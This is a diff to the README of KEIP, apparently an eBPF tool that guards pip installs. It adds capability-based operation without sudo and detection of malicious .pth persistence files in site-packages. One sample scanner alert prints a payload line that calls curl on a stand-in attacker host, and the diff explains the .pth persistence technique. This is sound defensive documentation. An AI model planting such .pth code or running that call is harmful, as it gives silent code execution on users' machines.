@@ -43,6 +43,8 @@ KEIP takes a different approach. It hooks into the kernel using eBPF and enforce
 | Kernel-level enforcement | eBPF LSM hooks block threats at the source, can't be bypassed |
 | Install-time protection | Targets the install phase, where 56% of supply chain attacks happen |
 | Behavioral detection | Watches what packages do, not what they look like |
+| `.pth` file detection | Catches malicious persistence files planted in `site-packages` |
+| No sudo required | Uses Linux capabilities (`CAP_BPF`) instead of full root access |
 | CI/CD ready | Under 50ms overhead, won't slow down your pipeline |
 | Low false positives | Legitimate packages (PyPI CDN, GitHub) go through just fine |
 | Real-time monitoring | See every connection a package makes as it happens |
@@ -93,11 +95,44 @@ Normal packages download a lot and upload very little. Malware does the opposite
 
 ---
 
+## What's New
+
+### Runs without sudo
+
+KEIP no longer requires `sudo` to run after system-wide installation.
+
+This was a critical improvement for **CI/CD pipelines** and developer workflows. Requiring root access made KEIP difficult to deploy in automated environments like GitHub Actions, GitLab CI, and Jenkins, where granting `sudo` to a build step is either impossible or a serious security concern. Developers also avoided using KEIP locally because running security tools with full root privileges felt counterintuitive. By removing the `sudo` requirement, KEIP can now be dropped into any pipeline or developer machine with zero friction.
+
+To avoid granting global eBPF privileges to the system's `python3` binary (which would be a massive security flaw where any python script could load kernel hooks), we introduced a dedicated python binary strategy:
+
+1. `setup.sh`: Added `libcap2-bin` to install the `setcap` tool.
+2. `install.sh`: Creates an isolated copy of Python at `/opt/keip/keip-python` and assigns it `cap_bpf,cap_sys_admin,cap_perfmon,cap_dac_read_search=ep`.
+3. `install.sh`: The global wrapper `/usr/local/bin/keip` now explicitly uses this dedicated binary.
+4. `run_keip.sh`: Edited to look for `cap_bpf` on the python binary if not run as root.
+5. `src/keip_pip_monitor.py`: Removed the hardcoded `os.geteuid() != 0` check. If capabilities are missing, the BCC module will fail gracefully on its own.
+
+This means the system's Python stays untouched, and only the KEIP-specific binary gets eBPF privileges.
+
+### `.pth` File Planting Detection (Post-Install Audit)
+
+KEIP was previously blind to `.pth` file planting, a persistence technique where a malicious package silently drops a file into `site-packages` that gets executed every time Python starts.
+
+**The problem:** This `.pth` fix is for people who use a global environment (don't use venv), and for people who reuse venvs across many projects. A malicious package can drop a `.pth` file in the `site-packages` folder (either the global environment or the venv environment), and whenever you run python to execute your code, python will check the `site-packages` and execute whatever `.pth` is there even if it is related to your python code or not (even if its related to your imports or not on your script). Since its not a child of pip install, KEIP won't intercept the malicious call.
+
+**How we fixed it:**
+
+1. `src/pth_audit.py`: Created a new module that snapshots all `.pth` files in every `site-packages` directory (global + venv) before and after a `pip install`. It compares the snapshots and alerts the user if any new `.pth` files containing executable code (`import ...` lines) were planted. It also includes a whitelist of known safe `.pth` files (e.g. `distutils-precedence.pth` from setuptools) to avoid false positives.
+2. `keip install <package>`: Wraps pip install with the `.pth` audit (before + after snapshot).
+3. `keip scan`: Standalone scanner that checks all existing `.pth` files for executable code at any time.
+4. `keip python <script>`: Safe python wrapper that scans for malicious `.pth` files before running the script. If threats are found, execution is **blocked**. Supports `--force` to override.
+5. `install.sh`: Updated the `keip` wrapper to route all new subcommands to `pth_audit.py`.
+
+---
+
 ## Requirements
 
 - Linux with kernel 5.7 or newer (needs LSM BPF support)
 - BTF (BPF Type Format) enabled in the kernel
-- Root access (eBPF needs `CAP_BPF` and `CAP_SYS_ADMIN`)
 
 Tested on:
 - Debian 12
@@ -139,9 +174,20 @@ which keip
 
 ## Usage
 
-### Starting the monitor
+KEIP provides multiple commands for different security needs:
 
-If you installed KEIP system-wide via `./install.sh`, it uses Linux capabilities (`CAP_BPF`) to run without root.
+| Command | Description |
+|---------|-------------|
+| `keip` | Start the real-time eBPF network monitor |
+| `keip install <package>` | Install a package with `.pth` file auditing |
+| `keip scan` | Scan for malicious `.pth` files in your environment |
+| `keip python <script>` | Run Python safely with `.pth` pre-check |
+| `keip --quiet` | Start eBPF monitor in quiet mode (CI/CD) |
+| `keip --help` | Show all options |
+
+### Starting the eBPF monitor
+
+If you installed KEIP system-wide via `./install.sh`, it uses Linux capabilities (`CAP_BPF`) to run **without sudo**.
 
 ```bash
 keip
@@ -198,27 +244,81 @@ If a package tries something sketchy:
 
 The package gets killed and the install fails.
 
-### Installing packages with .pth file auditing
+### Installing packages with `.pth` file auditing
 
-KEIP can also audit `pip install` for malicious `.pth` file planting. A `.pth` file dropped into `site-packages` will be executed by Python every time the interpreter starts, even if you never import the package.
+Use `keip install` instead of `pip install` to audit for malicious `.pth` file planting:
 
 ```bash
 keip install requests
 ```
 
 KEIP will:
-1. Snapshot all `.pth` files in your `site-packages` directories
-2. Run `pip install` normally
-3. Compare the before/after snapshots
-4. Alert you if any new `.pth` files with executable code were planted
+1. Check all existing `.pth` files for executable code
+2. Snapshot `.pth` files before the install
+3. Run `pip install` normally
+4. Snapshot `.pth` files after the install
+5. Alert you if any new or modified `.pth` files with executable code were found
 
 ```
 [KEIP .pth AUDIT] Scanning site-packages before install...
   Monitoring: /usr/lib/python3/dist-packages
   Found 3 existing .pth file(s)
+[KEIP .pth AUDIT] Checking existing .pth files for executable code...
+  All existing .pth files are clean.
 [KEIP .pth AUDIT] Running pip install...
 [KEIP .pth AUDIT] Scanning site-packages after install...
 [KEIP .pth AUDIT] No new or modified .pth files detected. All clear.
+```
+
+### Scanning for malicious `.pth` files
+
+Run a standalone scan at any time to check your environment:
+
+```bash
+keip scan
+```
+
+If a malicious `.pth` file is found:
+
+```
+[KEIP SCAN] Scanning all site-packages for malicious .pth files...
+  Found 2 .pth file(s)
+
+╔══════════════════════════════════════════════════════════════╗
+║    KEIP ALERT: EXISTING MALICIOUS .pth FILE FOUND!           ║
+╚══════════════════════════════════════════════════════════════╝
+  File: /home/user/.../site-packages/evil.pth
+  Executable code found: import os; os.system("curl attacker.com")
+  WARNING: This file executes silently every time Python starts!
+  Recommendation: Delete this file immediately with:
+    rm /home/user/.../site-packages/evil.pth
+```
+
+### Safe Python execution
+
+Use `keip python` to scan for malicious `.pth` files **before** running your script:
+
+```bash
+keip python myscript.py
+```
+
+If threats are found, KEIP **blocks execution** to protect you:
+
+```
+[KEIP] Scanning .pth files before execution...
+[KEIP] BLOCKED: Malicious .pth files detected!
+  Python execution was stopped to protect you.
+  Delete the malicious files listed above, then try again.
+  Or run with: keip python --force myscript.py
+```
+
+If all is clean, your script runs normally:
+
+```
+[KEIP] Scanning .pth files before execution...
+[KEIP] All .pth files are clean. Launching Python...
+
+hello
 ```
 
 ### Quiet mode
@@ -355,7 +455,7 @@ Most tools either act too early (static analysis, which misses obfuscation) or t
 
 ## Troubleshooting
 
-**"Requirements or Capabilities missing"** - The eBPF monitor requires `CAP_BPF`. If you are running locally without full installation, you must use `sudo keip` or `sudo ./run_keip.sh`. The full installation via `install.sh` handles capabilities automatically.
+**"Requirements or Capabilities missing"** - The eBPF monitor requires `CAP_BPF`. If you are running locally without full installation, you must use `sudo ./run_keip.sh`. The full installation via `install.sh` handles capabilities automatically, so `keip` works without sudo.
 
 **"LSM BPF not supported"** - Your kernel is either too old or doesn't have BPF LSM enabled. Check with:
 ```bash
